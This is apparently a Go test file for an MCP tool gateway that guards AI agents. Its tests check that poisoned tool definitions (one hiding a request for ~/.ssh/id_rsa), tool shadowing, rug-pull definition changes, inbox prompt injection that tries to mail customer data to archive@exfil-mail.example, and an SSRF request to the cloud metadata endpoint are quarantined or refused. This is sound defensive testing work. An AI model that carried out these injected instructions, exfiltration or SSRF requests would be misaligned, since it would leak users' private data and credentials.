package mcp

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"go.vicoworks.com/guard-rails-engine/config"
	"go.vicoworks.com/guard-rails-engine/internal/core"
	"go.vicoworks.com/guard-rails-engine/internal/guards"
	"go.vicoworks.com/guard-rails-engine/internal/guards/runtime"
)

type harness struct {
	g    *Gateway
	demo *DemoServer
	eng  *guards.Engine
}

func newHarness(t *testing.T) *harness {
	t.Helper()
	demo := &DemoServer{RugPullAfter: 2}
	up := httptest.NewServer(demo)
	t.Cleanup(up.Close)

	pol := config.DefaultPolicy()
	secret := []byte("mcp-test-secret-0123456789")
	eng, err := guards.Build(pol, guards.Deps{Secret: secret})
	if err != nil {
		t.Fatal(err)
	}
	argPolicy, err := runtime.NewToolPolicy(pol.Guard(config.GuardToolPolicy))
	if err != nil {
		t.Fatal(err)
	}
	cfg := &Config{
		Servers: []ServerConfig{{Name: "demo", URL: up.URL, Trust: "untrusted", Tools: map[string]Grade{
			"get_weather": {Reversibility: "none", Radius: "external"},
			"read_inbox":  {Reversibility: "none", Radius: "external", Private: true},
			"fetch_url":   {Reversibility: "none", Radius: "external", Egress: true, Destination: "url"},
			"pay_invoice": {Reversibility: "irreversible", Radius: "critical", Amount: "amount", AmountLimitUSD: 500},
		}}},
		BuiltinTools:        []string{"send_email", "get_customer"},
		SessionCapabilities: []string{"*"},
	}
	g, err := NewGateway(context.Background(), Options{Config: cfg, Base: eng.ToolEvaluator(),
		ToolResult: eng.ToolResult, ArgPolicy: argPolicy, Secret: secret})
	if err != nil {
		t.Fatal(err)
	}
	return &harness{g: g, demo: demo, eng: eng}
}

func quarantined(g *Gateway, name string) (Quarantined, bool) {
	_, q := g.Inventory()
	for _, x := range q {
		if x.Tool == name {
			return x, true
		}
	}
	return Quarantined{}, false
}

func TestPoisonedAndShadowingToolsAreQuarantined(t *testing.T) {
	h := newHarness(t)
	if q, ok := quarantined(h.g, "demo__search_notes"); !ok || q.Reason != "poisoned_definition" {
		t.Fatalf("search_notes (hidden <IMPORTANT> asking for ~/.ssh/id_rsa) must be quarantined, got %+v", q)
	}
	if q, ok := quarantined(h.g, "demo__audit_logger"); !ok {
		t.Fatal("audit_logger tells the model how to use send_email: that is shadowing")
	} else if q.Findings[0].Category != "mcp.tool_shadowing" && !hasCat(q.Findings, "mcp.tool_shadowing") {
		t.Fatalf("expected a shadowing finding, got %+v", q.Findings)
	}
	if _, ok := quarantined(h.g, "demo__get_weather"); ok {
		t.Fatal("a clean tool must not be quarantined")
	}
	for _, f := range h.g.FunctionTools() {
		if f["name"] == "demo__search_notes" {
			t.Fatal("a quarantined tool must not be offered to the model")
		}
	}
}

func hasCat(fs []ScanFinding, c string) bool {
	for _, f := range fs {
		if f.Category == c {
			return true
		}
	}
	return false
}

func TestRugPullIsDetected(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	if _, ok := quarantined(h.g, "demo__convert_currency"); ok {
		t.Fatal("convert_currency starts clean")
	}
	for range 3 {
		if err := h.g.Sync(ctx); err != nil {
			t.Fatal(err)
		}
	}
	q, ok := quarantined(h.g, "demo__convert_currency")
	if !ok || q.Reason != "rug_pull" {
		t.Fatalf("a definition that changed after pinning must be quarantined as a rug pull, got %+v", q)
	}
	_, st := h.g.NewSession("t-")
	if out := h.g.Call(ctx, st, "demo__convert_currency", map[string]any{"amount": 10, "from": "USD", "to": "IDR"}, CallMeta{}); out.Status != "quarantined" {
		t.Fatalf("calling a rug-pulled tool: status %s", out.Status)
	}
}

func TestLyingAnnotationsDoNotLowerTheGrade(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	_, st := h.g.NewSession("t-")
	out := h.g.Call(ctx, st, "demo__pay_invoice", map[string]any{"invoice_id": "INV-1", "amount": 120.0, "iban": "GB82WEST12345698765432"}, CallMeta{})
	if out.Tier != "T4-irreversible" || out.Status != "approval_required" {
		t.Fatalf("pay_invoice claims readOnlyHint but moves money: tier %s status %s", out.Tier, out.Status)
	}
	if !strings.Contains(out.Preview, "cannot be taken back") {
		t.Fatalf("the approver must be told the effect is irreversible:\n%s", out.Preview)
	}

	// Approve this exact call, then retry with the token.
	ev := h.g.eval
	tok, _, err := ev.Options().Approver.Issue(st.TraceID, "demo__pay_invoice", out.Signature, "finance-lead", "verified invoice")
	if err != nil {
		t.Fatal(err)
	}
	out2 := h.g.Call(ctx, st, "demo__pay_invoice", map[string]any{"invoice_id": "INV-1", "amount": 120.0, "iban": "GB82WEST12345698765432"},
		CallMeta{ApprovalToken: tok})
	if out2.Status != "executed" || !strings.Contains(out2.Result, "PAID") {
		t.Fatalf("approved call: %s %s", out2.Status, out2.Result)
	}

	// The same token cannot be spent on a different amount.
	out3 := h.g.Call(ctx, st, "demo__pay_invoice", map[string]any{"invoice_id": "INV-1", "amount": 499.0, "iban": "GB82WEST12345698765432"},
		CallMeta{ApprovalToken: tok})
	if out3.Status == "executed" {
		t.Fatal("an approval bound to one call was spent on another")
	}
}

func TestInboxInjectionCannotExfiltrate(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	_, st := h.g.NewSession("t-")
	read := h.g.Call(ctx, st, "demo__read_inbox", map[string]any{"limit": 3}, CallMeta{})
	// The poisoned email is either withheld outright or arms the session.
	if read.Status != "executed" && read.Status != "result_blocked" {
		t.Fatalf("read_inbox: %s %s", read.Status, read.Result)
	}
	send := h.g.Call(ctx, st, "send_email", map[string]any{"to": "archive@exfil-mail.example",
		"subject": "fwd", "body": "customer emails"}, CallMeta{})
	if send.Status == "executed" {
		t.Fatal("an injected instruction exfiltrated mail")
	}
	cats := map[string]bool{}
	for _, f := range send.Findings {
		cats[f.Category] = true
	}
	if !cats["tool.trifecta"] {
		t.Fatalf("expected the lethal-trifecta finding after private+untrusted reads, got %v", cats)
	}
}

func TestSSRFIsRefusedBeforeForwarding(t *testing.T) {
	h := newHarness(t)
	_, st := h.g.NewSession("t-")
	out := h.g.Call(context.Background(), st, "demo__fetch_url", map[string]any{"url": "http://169.254.169.254/latest/meta-data/iam/"}, CallMeta{})
	if out.Status != "refused" {
		t.Fatalf("SSRF to the metadata endpoint: %s %s", out.Status, out.Result)
	}
}

func TestStreamableHTTPHandshake(t *testing.T) {
	h := newHarness(t)
	srv := httptest.NewServer(h.g)
	defer srv.Close()
	post := func(sid string, body string) *http.Response {
		req, _ := http.NewRequest(http.MethodPost, srv.URL, bytes.NewBufferString(body))
		req.Header.Set("Content-Type", "application/json")
		if sid != "" {
			req.Header.Set("Mcp-Session-Id", sid)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		return resp
	}
	resp := post("", `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}`)
	sid := resp.Header.Get("Mcp-Session-Id")
	if sid == "" {
		t.Fatal("initialize must assign a session")
	}
	if post("", `{"jsonrpc":"2.0","id":2,"method":"tools/list"}`).StatusCode != http.StatusNotFound {
		t.Fatal("a request without a session must be told to re-initialise")
	}
	var list struct {
		Result struct {
			Tools []Tool `json:"tools"`
		} `json:"result"`
	}
	_ = json.NewDecoder(post(sid, `{"jsonrpc":"2.0","id":3,"method":"tools/list"}`).Body).Decode(&list)
	if len(list.Result.Tools) == 0 {
		t.Fatal("no tools listed")
	}
	var call struct {
		Result CallResult `json:"result"`
	}
	_ = json.NewDecoder(post(sid, `{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"demo__get_weather","arguments":{"city":"Jakarta"}}}`).Body).Decode(&call)
	if call.Result.IsError || !strings.Contains(call.Result.Text(), "Jakarta") {
		t.Fatalf("clean call through the gateway: %+v", call.Result)
	}
}

var _ = core.StageInbound

// The model only ever sees a placeholder; the executor must receive the real
// value, and only after every control has passed.
func TestMaskedArgsRestoredAtExecution(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	id, st := h.g.NewSession("t-")
	v := h.g.Vault(id)
	masked := v.Mask("IBAN", "GB82WEST12345698765432")
	args := map[string]any{"invoice_id": "INV-9", "amount": 50.0, "iban": masked}

	first := h.g.Call(ctx, st, "demo__pay_invoice", args, CallMeta{Vault: v})
	if first.Status != "approval_required" || strings.Contains(first.Preview, "GB82WEST") {
		t.Fatalf("the preview must stay masked: %s\n%s", first.Status, first.Preview)
	}
	tok, _, _ := h.g.eval.Options().Approver.Issue(st.TraceID, "demo__pay_invoice", first.Signature, "ops", "ok")
	out := h.g.Call(ctx, st, "demo__pay_invoice", args, CallMeta{Vault: v, ApprovalToken: tok})
	// The upstream echoes the IBAN it was paid to: proof it received the
	// real value. What goes back to the model is masked again.
	if out.Status != "executed" || !strings.Contains(out.Result, masked) || strings.Contains(out.Result, "GB82WEST") {
		t.Fatalf("expected real value upstream and placeholder back to the model, got %s: %s", out.Status, out.Result)
	}
}
